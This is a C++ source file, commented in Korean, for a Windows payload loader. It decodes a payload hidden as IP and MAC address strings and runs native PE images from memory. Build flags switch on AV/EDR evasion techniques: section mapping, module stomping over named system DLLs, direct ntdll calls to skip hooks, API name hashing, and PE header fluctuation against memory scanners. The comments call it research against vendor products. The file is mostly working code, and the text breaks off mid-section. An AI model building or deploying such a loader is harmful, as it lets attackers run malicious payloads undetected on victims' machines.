/*
 * Minimal payload loader
 *
 * 포함 기능:
 *   - HSF 페이로드 복호화 및 무결성 검사
 *   - Managed PE 실행
 *   - Native PE 실행
 *
 * Build:
 *   x86_64-w64-mingw32-g++ payload_only_2.cpp -o loader.exe \
 *     -std=c++17 -Wall -O2 \
 *     -lole32 -loleaut32 -lmscoree \
 *     -Wl,--dynamicbase,--nxcompat
 */

#define WIN32_LEAN_AND_MEAN

/* ============================================================
 * 우회 기법 컴파일 플래그 (연구용 A/B)
 *   0 = 비활성 (기본)
 *   1 = 활성
 * ============================================================ */
#ifndef ENABLE_SECTION_MAPPING
#  define ENABLE_SECTION_MAPPING 0  /* VirtualAlloc(MEM_PRIVATE) 대신
                                     * NtCreateSection + NtMapViewOfSection
                                     * (pagefile-backed → MEM_MAPPED) */
#endif
#ifndef ENABLE_MODULE_STOMP
#  define ENABLE_MODULE_STOMP    0  /* 정상 DLL 이미지 위에 페이로드 배치
                                     * (MEM_IMAGE + 파일 백킹 + 모듈명 유지) */
#endif
#ifndef ENABLE_PE_FLUCTUATION
#  define ENABLE_PE_FLUCTUATION  0  /* 백그라운드 스레드가 PE 헤더 매직을
                                     * 주기적으로 토글 (스캐너 스냅샷 회피) */
#endif
#ifndef ENABLE_INDIRECT_SYSCALL
#  define ENABLE_INDIRECT_SYSCALL 0 /* VirtualAlloc/VirtualProtect 대신
                                     * NtAllocateVirtualMemory/NtProtectVirtualMemory
                                     * 를 직접 호출 (kernel32 래퍼 우회) */
#endif
#ifndef ENABLE_API_HASHING
#  define ENABLE_API_HASHING     0  /* GetProcAddress(str) 대신
                                     * FNV-1a 컴파일 타임 해시로 EAT 순회.
                                     * 바이너리에 Nt* 문자열이 남지 않음. */
#endif

#include <Windows.h>

#include <objbase.h>
#include <oleauto.h>
#include <oaidl.h>
#include <unknwn.h>
#include <metahost.h>

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>

/* ================================================================
 * 로그
 * ================================================================ */
#ifdef RELEASE_BUILD
#  define LOG(...)  ((void)0)
#else
#  define LOG(...)  printf(__VA_ARGS__)
#endif

/* ================================================================
 * HSF 디코더
 * ================================================================ */
enum{ HSF_IPV4=1, HSF_IPV6=2, HSF_MAC=3 };
#define HSF_FNV_OFF  14695981039346656037ULL
#define HSF_FNV_PRI  1099511628211ULL
struct DATA{ void* data; size_t len; };

static int u16(FILE*f,uint16_t*v){ unsigned char b[2]; if(fread(b,1,2,f)!=2)return 0; *v=b[0]|((uint16_t)b[1]<<8); return 1; }
static int u64(FILE*f,uint64_t*v){ unsigned char b[8]; uint64_t r=0; if(fread(b,1,8,f)!=8)return 0; for(int i=0;i<8;i++)r|=(uint64_t)b[i]<<(i*8); *v=r; return 1; }
static uint64_t hfnv(uint64_t h,const unsigned char*d,size_t n){ for(size_t i=0;i<n;i++){h^=d[i];h*=HSF_FNV_PRI;} return h; }
static int hhex(char c){ if(c>='0'&&c<='9')return c-'0'; c=(char)toupper((unsigned char)c); if(c>='A'&&c<='F')return c-'A'+10; return -1; }

static int hIPv4(const char*t,unsigned char o[16]){
    const char*p=t; for(int i=0;i<4;i++){unsigned r=0,d=0;while(*p>='0'&&*p<='9'){r=r*10u+(*p-'0');if(r>255)return 0;++p;++d;}if(!d)return 0;o[i]=(unsigned char)r;if(i!=3){if(*p!='.')return 0;++p;}}return *p=='\0';
}
static int hIPv6(const char*t,unsigned char o[16]){
    if(strlen(t)!=39)return 0;
    for(int g=0;g<8;g++){size_t off=(size_t)g*5;int h0=hhex(t[off]),h1=hhex(t[off+1]),h2=hhex(t[off+2]),h3=hhex(t[off+3]);if(h0<0||h1<0||h2<0||h3<0)return 0;o[g*2]=(unsigned char)((h0<<4)|h1);o[g*2+1]=(unsigned char)((h2<<4)|h3);if(g!=7&&t[off+4]!=':')return 0;}return 1;
}
static int hMAC(const char*t,unsigned char o[16]){
    if(strlen(t)!=17)return 0;
    for(int i=0;i<6;i++){size_t off=(size_t)i*3;int hi=hhex(t[off]),lo=hhex(t[off+1]);if(hi<0||lo<0)return 0;o[i]=(unsigned char)((hi<<4)|lo);if(i!=5&&t[off+2]!='-')return 0;}return 1;
}
static size_t hChunk(unsigned char m){switch(m){case HSF_IPV4:return 4;case HSF_IPV6:return 16;case HSF_MAC:return 6;default:return 0;}}
static int hRec(unsigned char m,const char*t,unsigned char o[16]){memset(o,0,16);switch(m){case HSF_IPV4:return hIPv4(t,o);case HSF_IPV6:return hIPv6(t,o);case HSF_MAC:return hMAC(t,o);default:return 0;}}

static DATA LoadHSF(const char*path){
    DATA res{NULL,0};
    FILE*fp=fopen(path,"rb"); if(!fp) return res;

    unsigned char magic[4]{},ver=0,mode=0,rsv[2]{};
    uint64_t orig=0,cnt=0,exp_h=0,act=HSF_FNV_OFF,written=0;
    void* buf=NULL;

    if(fread(magic,1,4,fp)!=4||memcmp(magic,"HSF1",4)||
       fread(&ver,1,1,fp)!=1||fread(&mode,1,1,fp)!=1||fread(rsv,1,2,fp)!=2||
       !u64(fp,&orig)||!u64(fp,&cnt)||!u64(fp,&exp_h))
    { LOG("[-] Bad header\n"); goto cl; }

    if(ver!=1||rsv[0]||rsv[1]){ LOG("[-] Version\n"); goto cl; }
    { size_t ck=hChunk(mode); if(!ck||cnt!=orig/ck+(orig%ck!=0)) goto cl; }
    if(!orig||orig>0x7FFFFFFFull) goto cl;

    buf=malloc((size_t)orig); if(!buf) goto cl;

    for(uint64_t idx=0;idx<cnt;idx++){
        uint16_t tl=0; char text[64]{}; unsigned char dec[16]{}; size_t bw;
        if(!u16(fp,&tl)||!tl||tl>=64||fread(text,1,tl,fp)!=tl) goto cl;
        text[tl]='\0';
        if(!hRec(mode,text,dec)) goto cl;
        bw=hChunk(mode); if((uint64_t)bw>orig-written)bw=(size_t)(orig-written);
        if(bw){memcpy((BYTE*)buf+written,dec,bw);act=hfnv(act,dec,bw);written+=bw;}
    }
    if(written!=orig||fgetc(fp)!=EOF||act!=exp_h){ LOG("[-] Integrity\n"); goto cl; }
    LOG("[+] HSF OK: %llu bytes\n",(unsigned long long)written);
    res.data=buf; res.len=(size_t)written; buf=NULL;
cl:
    fclose(fp);
    if(buf) free(buf);
    return res;
}

/* ================================================================
 * PE 유틸
 * ================================================================ */
static bool IsMgd(const void*b,size_t sz){
    if(!b||sz<sizeof(IMAGE_DOS_HEADER))return false;
    auto*dos=(const IMAGE_DOS_HEADER*)b;
    if(dos->e_magic!=IMAGE_DOS_SIGNATURE||dos->e_lfanew<=0)return false;
    size_t off=(size_t)dos->e_lfanew;
    if(off>sz)return false;
    auto*n32=(const IMAGE_NT_HEADERS32*)((const BYTE*)b+off);
    if(*(const DWORD*)((const BYTE*)b+off)!=IMAGE_NT_SIGNATURE)return false;
    const IMAGE_DATA_DIRECTORY*clr=NULL;
    if(n32->OptionalHeader.Magic==IMAGE_NT_OPTIONAL_HDR64_MAGIC){
        auto*n64=(const IMAGE_NT_HEADERS64*)((const BYTE*)b+off);
        if(n64->OptionalHeader.NumberOfRvaAndSizes<=IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR)return false;
        clr=&n64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR];
    } else {
        if(n32->OptionalHeader.NumberOfRvaAndSizes<=IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR)return false;
        clr=&n32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR];
    }
    return clr&&clr->VirtualAddress&&clr->Size>=sizeof(IMAGE_COR20_HEADER);
}

/* ================================================================
 * Native PE 실행
 * ================================================================ */
typedef struct _NPE {
    PVOID              Base;
    ULONG_PTR          ImgBase;
    PVOID              Entry;
    BOOL               Is64;
    BOOL               IsDLL;
    DWORD              ImgSize;
    WORD               NumSec;
    union { IMAGE_NT_HEADERS32* N32; IMAGE_NT_HEADERS64* N64; };
    IMAGE_SECTION_HEADER* Secs;
} NPE;

static IMAGE_DATA_DIRECTORY* NDir(NPE* p,DWORD i){
    return p->Is64? &p->N64->OptionalHeader.DataDirectory[i]
                 : &p->N32->OptionalHeader.DataDirectory[i];
}
static DWORD NEP(NPE* p){ return p->Is64? p->N64->OptionalHeader.AddressOfEntryPoint
                                        : p->N32->OptionalHeader.AddressOfEntryPoint; }

static bool NParse(void* d,size_t sz,NPE* p){
    if(sz<sizeof(IMAGE_DOS_HEADER))return false;
    auto*dos=(IMAGE_DOS_HEADER*)d;
    if(dos->e_magic!=IMAGE_DOS_SIGNATURE||dos->e_lfanew<=0)return false;
    if((size_t)dos->e_lfanew+sizeof(IMAGE_NT_HEADERS)>sz)return false;
    auto*nt=(IMAGE_NT_HEADERS*)((BYTE*)d+dos->e_lfanew);
    if(nt->Signature!=IMAGE_NT_SIGNATURE)return false;
    if(nt->OptionalHeader.Magic==IMAGE_NT_OPTIONAL_HDR64_MAGIC){
        p->Is64=true;  p->N64=(IMAGE_NT_HEADERS64*)nt;
        p->ImgBase=(ULONG_PTR)p->N64->OptionalHeader.ImageBase;
        p->ImgSize=p->N64->OptionalHeader.SizeOfImage;
        p->NumSec =p->N64->FileHeader.NumberOfSections;
        p->IsDLL  =(p->N64->FileHeader.Characteristics&IMAGE_FILE_DLL)!=0;
    } else if(nt->OptionalHeader.Magic==IMAGE_NT_OPTIONAL_HDR32_MAGIC){
        p->Is64=false; p->N32=(IMAGE_NT_HEADERS32*)nt;
        p->ImgBase=(ULONG_PTR)p->N32->OptionalHeader.ImageBase;
        p->ImgSize=p->N32->OptionalHeader.SizeOfImage;
        p->NumSec =p->N32->FileHeader.NumberOfSections;
        p->IsDLL  =(p->N32->FileHeader.Characteristics&IMAGE_FILE_DLL)!=0;
    } else return false;
    DWORD so=dos->e_lfanew+(p->Is64?sizeof(IMAGE_NT_HEADERS64):sizeof(IMAGE_NT_HEADERS32));
    if(so+(DWORD)p->NumSec*sizeof(IMAGE_SECTION_HEADER)>sz)return false;
    p->Secs=(IMAGE_SECTION_HEADER*)((BYTE*)d+so);
    LOG("[*] Native PE: %s, ImgBase=%p, Size=%lu\n",p->Is64?"x64":"x86",
        (PVOID)p->ImgBase,p->ImgSize);
    return true;
}

#if ENABLE_API_HASHING
/* ============================================================
 * API Hashing (Compile-time FNV-1a) — 정적 문자열 탐지 회피
 * ------------------------------------------------------------
 * GetProcAddress(hMod, "NtSomething") 를 사용하면 함수명 문자열이
 * 바이너리 .rdata 에 그대로 박혀 정적 heuristic 에 걸린다.
 * 컴파일 타임 FNV-1a 해시 상수와 EAT 순회로 함수 주소를 얻으면
 * 바이너리에 함수명이 남지 않음.
 *
 * 참조:
 *   - Maldev Academy #051/055 String Hashing / API Hashing
 *   - Compile Time API Hashing #057
 * ============================================================ */
constexpr uint32_t FNV1A_OFFSET = 0x811C9DC5u;
constexpr uint32_t FNV1A_PRIME  = 0x01000193u;

constexpr uint32_t ah_hash(const char* s, uint32_t h = FNV1A_OFFSET){
    return *s ? ah_hash(s+1, (h ^ (uint32_t)(uint8_t)*s) * FNV1A_PRIME) : h;
}

static PVOID ResolveByHash(HMODULE hMod, uint32_t targetHash){
    if(!hMod) return NULL;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)hMod;
    if(dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
    IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)((BYTE*)hMod + dos->e_lfanew);
    IMAGE_DATA_DIRECTORY expDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if(!expDir.VirtualAddress || !expDir.Size) return NULL;

    IMAGE_EXPORT_DIRECTORY* exp = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)hMod + expDir.VirtualAddress);
    DWORD* names = (DWORD*)((BYTE*)hMod + exp->AddressOfNames);
    WORD*  ords  = (WORD* )((BYTE*)hMod + exp->AddressOfNameOrdinals);
    DWORD* funcs = (DWORD*)((BYTE*)hMod + exp->AddressOfFunctions);

    for(DWORD i = 0; i < exp->NumberOfNames; i++){
        const char* name = (const char*)((BYTE*)hMod + names[i]);
        /* Runtime FNV-1a 계산 후 컴파일 타임 상수와 비교 */
        uint32_t h = FNV1A_OFFSET;
        for(const char* q = name; *q; ++q){
            h ^= (uint32_t)(uint8_t)*q;
            h *= FNV1A_PRIME;
        }
        if(h == targetHash){
            return (PVOID)((BYTE*)hMod + funcs[ords[i]]);
        }
    }
    return NULL;
}
#endif /* ENABLE_API_HASHING */

#if ENABLE_SECTION_MAPPING
/* ============================================================
 * Section Object 어댑터 (MEM_PRIVATE → MEM_MAPPED)
 * ------------------------------------------------------------
 * NtCreateSection(SEC_COMMIT, pagefile-backed) + NtMapViewOfSection.
 * VirtualAlloc이 만드는 MEM_PRIVATE 영역 대신 MEM_MAPPED 영역을 얻는다.
 *
 * 참조:
 *   - Windows Internals 6판 (Section Objects)
 *   - MemoryModule 계열 대체 접근: https://github.com/fancycode/MemoryModule
 *   - ReflectiveDLLInjection 스타일 매핑: https://github.com/stephenfewer/ReflectiveDLLInjection
 *
 * 관측 목적: 벤더 메모리 스캐너가 MEM_PRIVATE + PE 구조 조합에만
 *          휴리스틱 점수를 매기는지, MEM_MAPPED로 바꾸면 신호가
 *          사라지는지 A/B 비교.
 * ============================================================ */
typedef LONG NTSTATUS;
#define SEC_COMMIT_FLAG 0x08000000UL

typedef NTSTATUS (NTAPI *fn_NtCreateSection)(
    PHANDLE, ACCESS_MASK, PVOID, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
typedef NTSTATUS (NTAPI *fn_NtMapViewOfSection)(
    HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER,
    PSIZE_T, DWORD, ULONG, ULONG);

static PVOID NAllocSection(SIZE_T size){
    HMODULE hNt = GetModuleHandleA("ntdll.dll");
    if(!hNt){ LOG("[-] ntdll module handle failed\n"); return NULL; }
#if ENABLE_API_HASHING
    static constexpr uint32_t H_NtCreateSection    = ah_hash("NtCreateSection");
    static constexpr uint32_t H_NtMapViewOfSection = ah_hash("NtMapViewOfSection");
    auto pCreate = (fn_NtCreateSection)ResolveByHash(hNt, H_NtCreateSection);
    auto pMap    = (fn_NtMapViewOfSection)ResolveByHash(hNt, H_NtMapViewOfSection);
#else
    auto pCreate = (fn_NtCreateSection)GetProcAddress(hNt, "NtCreateSection");
    auto pMap    = (fn_NtMapViewOfSection)GetProcAddress(hNt, "NtMapViewOfSection");
#endif
    if(!pCreate || !pMap){ LOG("[-] Nt* resolve failed\n"); return NULL; }

    HANDLE hSec = NULL;
    LARGE_INTEGER li; li.QuadPart = (LONGLONG)size;
    NTSTATUS st = pCreate(&hSec,
        0xF001FUL,                     /* SECTION_ALL_ACCESS */
        NULL,
        &li,
        PAGE_EXECUTE_READWRITE,
        SEC_COMMIT_FLAG,
        NULL);                         /* pagefile-backed */
    if(st != 0){
        LOG("[-] NtCreateSection failed: 0x%lX\n", (unsigned long)st);
        return NULL;
    }

    PVOID base = NULL;
    SIZE_T viewSize = 0;
    st = pMap(hSec,
        (HANDLE)-1,                    /* NtCurrentProcess */
        &base,
        0, 0, NULL,
        &viewSize,
        1,                             /* ViewShare */
        0,
        PAGE_EXECUTE_READWRITE);
    if(st != 0){
        LOG("[-] NtMapViewOfSection failed: 0x%lX\n", (unsigned long)st);
        CloseHandle(hSec);
        return NULL;
    }
    /* view가 참조 유지 → 섹션 핸들은 즉시 닫아도 됨 */
    CloseHandle(hSec);
    LOG("[+] Section-mapped base=%p viewSize=%zu (MEM_MAPPED)\n", base, viewSize);
    return base;
}
#endif /* ENABLE_SECTION_MAPPING */

#if ENABLE_MODULE_STOMP
/* ============================================================
 * Module Stomping — 정상 DLL 이미지 위에 페이로드 배치
 * ------------------------------------------------------------
 * LoadLibraryA로 큰 unused DLL을 로드한 뒤, 그 이미지 영역
 * (MEM_IMAGE + 파일 백킹 + 모듈 리스트에 정상 이름)에 페이로드를
 * 오버라이트한다. Section Object 매핑은 pagefile-backed MEM_MAPPED
 * (파일 없음)인 반면 Module Stomping은 실제 파일 참조 MEM_IMAGE.
 *
 * 참조:
 *   - NCC Group: An Introduction to Detecting Module Stomping
 *     https://research.nccgroup.com/2020/07/08/an-introduction-to-detecting-module-stomping/
 *   - Maldev Academy #127 Module Stomping
 *
 * 관측 목적: BitDefender ATC가 "MEM_IMAGE + 정상 모듈명" 조합에
 *          휴리스틱 점수를 감산하는지, 아니면 파일 백킹 vs 코드
 *          내용 불일치도 검사하는지 A/B 확인.
 * ============================================================ */

/* 대상 DLL 후보 — 크기 넉넉, 대부분 프로세스에서 사용 안 함.
 * 페이로드 SizeOfImage 이상인 첫 번째 DLL 선택. */
static const char* MOD_STOMP_TARGETS[] = {
    "xpsprint.dll",     /* ~2MB, XPS 프린터 (드묾) */
    "AppXReg.dll",      /* ~130KB, 앱 등록 */
    "wldp.dll",         /* ~90KB, Windows Lockdown Policy */
    "sensrsvc.dll",     /* ~40KB, sensor service */
    "WSOCK32.dll",      /* ~19KB, legacy socket */
    NULL
};

static PVOID NAllocViaModuleStomp(SIZE_T needed){
    for(int i=0; MOD_STOMP_TARGETS[i]; i++){
        HMODULE hMod = LoadLibraryA(MOD_STOMP_TARGETS[i]);
        if(!hMod){
            LOG("[!] LoadLibrary(%s) failed\n", MOD_STOMP_TARGETS[i]);
            continue;
        }
        /* 모듈 이미지의 SizeOfImage를 자체 PE 헤더에서 읽음 */
        IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)hMod;
        if(dos->e_magic != IMAGE_DOS_SIGNATURE){
            FreeLibrary(hMod);
            continue;
        }
        IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)((BYTE*)hMod + dos->e_lfanew);
        DWORD sizeOfImage = nt->OptionalHeader.SizeOfImage;
        if(sizeOfImage < needed){
            LOG("[!] %s too small (%lu < %zu)\n",
                MOD_STOMP_TARGETS[i], (unsigned long)sizeOfImage, needed);
            FreeLibrary(hMod);
            continue;
        }
        /* 전체 이미지를 RWX로 변경 — 페이로드 매핑 준비 */
        DWORD old = 0;
        if(!VirtualProtect(hMod, sizeOfImage, PAGE_EXECUTE_READWRITE, &old)){
            LOG("[!] VirtualProtect on %s failed: %lu\n",
                MOD_STOMP_TARGETS[i], GetLastError());
            FreeLibrary(hMod);
            continue;
        }
        LOG("[+] Module stomped: %s @ %p (size=%lu, MEM_IMAGE + file-backed)\n",
            MOD_STOMP_TARGETS[i], hMod, (unsigned long)sizeOfImage);
        return (PVOID)hMod;
    }
    return NULL;
}
#endif /* ENABLE_MODULE_STOMP */

#if ENABLE_INDIRECT_SYSCALL
/* ============================================================
 * Indirect Syscall — Nt-level API 직접 호출 (kernel32 래퍼 우회)
 * ------------------------------------------------------------
 * VirtualAlloc(kernel32) 대신 NtAllocateVirtualMemory(ntdll) 직접 호출.
 * VirtualProtect(kernel32) 대신 NtProtectVirtualMemory(ntdll) 직접 호출.
 *
 * 참조:
 *   - SysWhispers2: https://github.com/jthuraisamy/SysWhispers2
 *   - Windows Internals 6판 (Native API 레이어)
 *
 * 관측 목적: 벤더가 kernel32 export에 훅을 걸어두었는지 확인.
 *          걸어놓았다면 이 우회로 신호가 사라짐. 걸어놓지 않았다면
 *          (ntdll이나 커널 콜백만 씀) 결과 변화 없음.
 *
 * 주의: 이건 진짜 "indirect syscall (HellsHall)"이 아님. ntdll의 syscall
 *      래퍼는 여전히 통과. 진짜는 .asm 파일 + SSN 파싱 필요.
 * ============================================================ */
#ifndef _INDIRECT_SYSCALL_TYPES
#define _INDIRECT_SYSCALL_TYPES
typedef LONG NTSTATUS_ISC;
#endif

typedef NTSTATUS_ISC (NTAPI *fn_NtAllocateVirtualMemory)(
    HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS_ISC (NTAPI *fn_NtProtectVirtualMemory)(
    HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);

static PVOID NtVA(PVOID preferred, SIZE_T size, DWORD allocType, DWORD prot){
    static fn_NtAllocateVirtualMemory p = NULL;
    if(!p){
        HMODULE hNt = GetModuleHandleA("ntdll.dll");
#if ENABLE_API_HASHING
        static constexpr uint32_t H = ah_hash("NtAllocateVirtualMemory");
        p = (fn_NtAllocateVirtualMemory)ResolveByHash(hNt, H);
#else
        p = (fn_NtAllocateVirtualMemory)GetProcAddress(hNt, "NtAllocateVirtualMemory");
#endif
    }
    if(!p) return NULL;
    PVOID base = preferred;
    SIZE_T sz = size;
    NTSTATUS_ISC st = p((HANDLE)-1, &base, 0, &sz, allocType, prot);
    if(st != 0){
        LOG("[!] NtAllocateVirtualMemory failed: 0x%lX\n", (unsigned long)st);
        return NULL;
    }
    return base;
}

static BOOL NtVP(PVOID addr, SIZE_T size, DWORD newProt, PDWORD oldProt){
    static fn_NtProtectVirtualMemory p = NULL;
    if(!p){
        HMODULE hNt = GetModuleHandleA("ntdll.dll");
#if ENABLE_API_HASHING
        static constexpr uint32_t H = ah_hash("NtProtectVirtualMemory");
        p = (fn_NtProtectVirtualMemory)ResolveByHash(hNt, H);
#else
        p = (fn_NtProtectVirtualMemory)GetProcAddress(hNt, "NtProtectVirtualMemory");
#endif
    }
    if(!p) return FALSE;
    PVOID base = addr;
    SIZE_T sz = size;
    ULONG old = 0;
    NTSTATUS_ISC st = p((HANDLE)-1, &base, &sz, newProt, &old);
    if(oldProt) *oldProt = (DWORD)old;
    return st == 0;
}
#endif /* ENABLE_INDIRECT_SYSCALL */

static bool NMap(void* d,size_t sz,NPE* p){
    if(!NParse(d,sz,p))return false;
    PVOID base=NULL;
#if ENABLE_MODULE_STOMP
    base = NAllocViaModuleStomp(p->ImgSize);
    if(!base){
        LOG("[!] Module stomp failed, falling back\n");
    }
#endif
#if ENABLE_SECTION_MAPPING
    if(!base){
        base = NAllocSection(p->ImgSize);
        if(!base){
            LOG("[!] Section mapping failed, falling back to VirtualAlloc\n");
        }
    }
#endif
    if(!base){
#if ENABLE_INDIRECT_SYSCALL
        base=NtVA((PVOID)p->ImgBase,p->ImgSize,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
        if(!base) base=NtVA(NULL,p->ImgSize,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
#else
        base=VirtualAlloc((PVOID)p->ImgBase,p->ImgSize,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
        if(!base) base=VirtualAlloc(NULL,p->ImgSize,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
#endif
    }
    if(!base){LOG("[-] allocation failed\n");return false;}
    p->Base=base;
    DWORD hs=p->Is64?p->N64->OptionalHeader.SizeOfHeaders:p->N32->OptionalHeader.SizeOfHeaders;
    memcpy(base,d,hs);
    auto*sec=p->Secs;
    for(WORD i=0;i<p->NumSec;i++,sec++){
        if(!sec->SizeOfRawData)continue;
        PVOID dst=(BYTE*)base+sec->VirtualAddress;
        PVOID src=(BYTE*)d+sec->PointerToRawData;
        DWORD n=sec->SizeOfRawData;
        if((size_t)sec->PointerToRawData+n>sz)n=(DWORD)(sz-sec->PointerToRawData);
        memcpy(dst,src,n);
        if(sec->Misc.VirtualSize>sec->SizeOfRawData)
            memset((BYTE*)dst+n,0,sec->Misc.VirtualSize-sec->SizeOfRawData);
    }
    p->Entry=(BYTE*)base+NEP(p);
    LOG("[+] Native mapped at %p (delta=%lld), EP=%p\n",base,
        (long long)((ULONG_PTR)base-p->ImgBase),p->Entry);
    return true;
}

static bool NReloc(NPE* p){
    auto*dir=NDir(p,IMAGE_DIRECTORY_ENTRY_BASERELOC);
    ULONG_PTR delta=(ULONG_PTR)p->Base-p->ImgBase;
    if(!dir->VirtualAddress||!dir->Size){
        if(delta!=0){LOG("[-] No reloc dir, cannot run at this base\n");return false;}
        return true;
    }
    if(!delta)return true;
    LOG("[*] Relocations (delta=%p)\n",(PVOID)delta);
    auto*r=(IMAGE_BASE_RELOCATION*)((BYTE*)p->Base+dir->VirtualAddress);
    BYTE*end=(BYTE*)r+dir->Size;
    while((BYTE*)r<end&&r->VirtualAddress&&r->SizeOfBlock>=sizeof(IMAGE_BASE_RELOCATION)){
        BYTE*rb=(BYTE*)p->Base+r->VirtualAddress;
        WORD*rd=(WORD*)((BYTE*)r+sizeof(IMAGE_BASE_RELOCATION));
        DWORD n=(r->SizeOfBlock-sizeof(IMAGE_BASE_RELOCATION))/sizeof(WORD);
        for(DWORD i=0;i<n;i++){
            WORD t=rd[i]>>12,o=rd[i]&0xFFF;
#ifdef _WIN64
            if(t==IMAGE_REL_BASED_DIR64) *(PULONG_PTR)(rb+o)+=delta;
#else
            if(t==IMAGE_REL_BASED_HIGHLOW) *(PULONG)(rb+o)+=(ULONG)delta;
#endif
            else if(t==IMAGE_REL_BASED_HIGH) *(PULONG)(rb+o)+=(ULONG)(delta>>16);
            else if(t==IMAGE_REL_BASED_LOW)  *(PULONG)(rb+o)+=(ULONG)(delta&0xFFFF);
        }
        r=(IMAGE_BASE_RELOCATION*)((BYTE*)r+r->SizeOfBlock);
    }
    return true;
}

static bool NImports(NPE* p){
    auto*dir=NDir(p,IMAGE_DIRECTORY_ENTRY_IMPORT);
    if(!dir->VirtualAddress||!dir->Size)return true;
    LOG("[*] Imports...\n");
    auto*desc=(IMAGE_IMPORT_DESCRIPTOR*)((BYTE*)p->Base+dir->VirtualAddress);
    while(desc->Name){
        char*dll=(char*)((BYTE*)p->Base+desc->Name);
        HMODULE hm=LoadLibraryA(dll);
        if(!hm){LOG("[-] LoadLibrary failed: %s\n",dll);return false;}
        auto*ot=(IMAGE_THUNK_DATA*)((BYTE*)p->Base+desc->OriginalFirstThunk);
        auto*ft=(IMAGE_THUNK_DATA*)((BYTE*)p->Base+desc->FirstThunk);
        if(!desc->OriginalFirstThunk) ot=ft;
        while(ot->u1.AddressOfData){
            FARPROC fn;
            if(IMAGE_SNAP_BY_ORDINAL(ot->u1.Ordinal))
                fn=GetProcAddress(hm,(LPCSTR)IMAGE_ORDINAL(ot->u1.Ordinal));
            else{
                auto*ibn=(IMAGE_IMPORT_BY_NAME*)((BYTE*)p->Base+(ULONG_PTR)ot->u1.AddressOfData);
                fn=GetProcAddress(hm,ibn->Name);
            }
            if(!fn){LOG("[-] Unresolved import in %s\n",dll);return false;}
            ft->u1.Function=(ULONG_PTR)fn;
            ot++;ft++;
        }
        desc++;
    }
    return true;
}

static void NProtect(NPE* p){
    auto*sec=p->Secs;
    for(WORD i=0;i<p->NumSec;i++,sec++){
        DWORD prot=PAGE_NOACCESS,old;
        if(sec->Characteristics&IMAGE_SCN_MEM_EXECUTE)
            prot=(sec->Characteristics&IMAGE_SCN_MEM_WRITE)?PAGE_EXECUTE_READWRITE
               :(sec->Characteristics&IMAGE_SCN_MEM_READ)?PAGE_EXECUTE_READ:PAGE_EXECUTE;
        else if(sec->Characteristics&IMAGE_SCN_MEM_WRITE) prot=PAGE_READWRITE;
        else if(sec->Characteristics&IMAGE_SCN_MEM_READ)  prot=PAGE_READONLY;
        if(prot!=PAGE_NOACCESS)
#if ENABLE_INDIRECT_SYSCALL
            NtVP((BYTE*)p->Base+sec->VirtualAddress,sec->Misc.VirtualSize,prot,&old);
#else
            VirtualProtect((BYTE*)p->Base+sec->VirtualAddress,sec->Misc.VirtualSize,prot,&old);
#endif
    }
}

static void NTls(NPE* p){
    auto*dir=NDir(p,IMAGE_DIRECTORY_ENTRY_TLS);
    if(!dir->VirtualAddress||!dir->Size)return;
    auto*tls=(IMAGE_TLS_DIRECTORY*)((BYTE*)p->Base+dir->VirtualAddress);
    if(!tls->AddressOfCallBacks)return;
    LOG("[*] TLS callbacks...\n");
    auto**cbs=(PIMAGE_TLS_CALLBACK*)tls->AddressOfCallBacks;
    while(*cbs){(*cbs)(p->Base,DLL_PROCESS_ATTACH,NULL);cbs++;}
}

/* EXE와 DLL은 진입점 계약이 다르므로 호출 규약을 분리한다.
 * 일반 함수 호출을 사용하면 컴파일러가 x64 shadow space, 16-byte 정렬,
 * 반환 주소를 모두 올바르게 보존한다. */
static int NCall(PVOID ep,PVOID base,BOOL isDll){
    if(isDll){
        auto dllEntry=(BOOL(WINAPI*)(HINSTANCE,DWORD,LPVOID))ep;
        return dllEntry((HINSTANCE)base,DLL_PROCESS_ATTACH,NULL)?0:-1;
    }
    auto exeEntry=(void(WINAPI*)(void))ep;
    exeEntry();
    return 0;
}

static DWORD WINAPI NativeThread(LPVOID lp){
    NPE* p=(NPE*)lp;
    LOG("[+] Native entry executing...\n");
    int r=-1;
    __try{ r=NCall(p->Entry,p->Base,p->IsDLL); LOG("[*] Native entry returned %d\n",r);}
    __except(EXCEPTION_EXECUTE_HANDLER){LOG("[-] Native exception: %08lx\n",GetExceptionCode());}
    return 0;
}

#if ENABLE_PE_FLUCTUATION
/* ============================================================
 * PeFluctuation — 백그라운드 스레드로 PE 헤더 매직을 주기적 토글
 * ------------------------------------------------------------
 * 헤더는 NProtect 대상이 아니라 PAGE_READWRITE 유지 → VirtualProtect
 * 왕복 없이 직접 바이트 XOR로 상태를 뒤집는다. 스캐너가 스냅샷을
 * 찍는 순간마다 서로 다른 상태(정상 ↔ 파괴)를 보게 되어 시그니처
 * 매칭 및 구조 휴리스틱이 일관성 없이 동작.
 *
 * 참조:
 *   - Maldev Academy #121 PeFluctuation
 *   - 개념: PE 이미지의 시간축 상태 변동으로 정적 스냅샷 스캔 회피
 *
 * 안전성: MZ / PE 시그니처 4바이트만 토글. 페이로드 코드가
 *        자기 PE 헤더를 참조하는 경우는 드물어 크래시 위험 낮음.
 * ============================================================ */
static volatile BYTE* g_FluctPtr    = NULL;
static DWORD          g_FluctNtOff  = 0;
